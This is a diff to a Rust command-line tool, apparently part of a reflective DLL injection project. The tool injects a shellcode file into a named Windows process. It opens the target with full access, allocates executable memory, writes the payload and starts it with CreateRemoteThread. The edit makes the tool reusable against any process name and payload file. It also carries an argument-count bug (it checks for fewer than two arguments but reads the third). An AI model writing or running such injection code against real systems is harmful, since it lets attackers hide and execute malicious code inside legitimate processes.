@@ -1,25 +1,27 @@
-use std::{ptr::null_mut};
+use std::{ptr::null_mut, env};
+use sysinfo::{SystemExt, Pid, ProcessExt};
 use windows_sys::Win32::{System::{Threading::{OpenProcess, PROCESS_ALL_ACCESS, CreateRemoteThread}, Memory::{VirtualAllocEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE}, Diagnostics::Debug::{WriteProcessMemory}}, Foundation::{CloseHandle}};
-
-use crate::pe_utils::{get_process_id_by_name};
-
-mod pe_utils;
 
 fn main() {
     env_logger::init();
 
-    //inject.exe <process> <shellcode.bin>
+    let args: Vec<String> = env::args().collect();
+
+    if args.len() < 2 {
+        println!("Usage: inject.exe <process> <shellcode.bin>");
+        std::process::exit(1);
+    }
+
+    let process_name = &args[1];
+    let file_path = &args[2];
     
-    let process_id = get_process_id_by_name("notepad.exe") as u32;
+    let process_id = get_process_id_by_name(process_name) as u32;
     log::debug!("[+] Process ID: {}", process_id);
 
-    // For normal RDI
-    //let shellcode = include_bytes!(r"C:\Users\memn0ps\Documents\GitHub\srdi-rs\reflective_loader\target\debug\reflective_loader.dll");
-    
-    let image_bytes = include_bytes!(r"C:\Users\memn0ps\Documents\GitHub\srdi-rs\shellcode.bin");
+    //let image_bytes = include_bytes!(r"C:\Users\memn0ps\Documents\GitHub\srdi-rs\shellcode.bin");
+    let image_bytes = std::fs::read(file_path).expect("Failed to read the file path");
     let module_size = image_bytes.len();
     let module_base = image_bytes.as_ptr();
-    //let rdi_module_base = unsafe { module_base.add(SHELLCODE_SIZE) as usize };
 
     // Get a handle to the target process with PROCESS_ALL_ACCESS
     let process_handle = unsafe { 
@@ -68,7 +70,8 @@ fn main() {
         panic!("Failed to write the image to the target process");
     }
 
-    pause();
+    //For debugging
+    //pause();
 
     // Create remote thread and execute our shellcode
     let thread_handle = unsafe { 
@@ -76,18 +79,31 @@ fn main() {
         process_handle,
         null_mut(),
         0,
-        Some(std::mem::transmute(shellcode_address as usize)), //used to be reflective_loader for normal RDI
+        Some(std::mem::transmute(shellcode_address as usize)),
         std::ptr::null_mut(), // Can be used to pass the first parameter to loader but we're using shellcode to call our loader with more parameters
         0,
         null_mut(),
         )
     };
 
-    // Close thread handle
+    // Close thread and process handle
     unsafe { 
         CloseHandle(thread_handle);
         CloseHandle(process_handle); 
     };
+}
+
+/// Get process ID by name
+pub fn get_process_id_by_name(target_process: &str) -> Pid {
+    let mut system = sysinfo::System::new();
+    system.refresh_all();
+
+    let mut process_id = 0;
+
+    for process in system.process_by_name(target_process) {
+        process_id = process.pid();
+    }
+    return process_id;
 }
 
 #[allow(dead_code)]
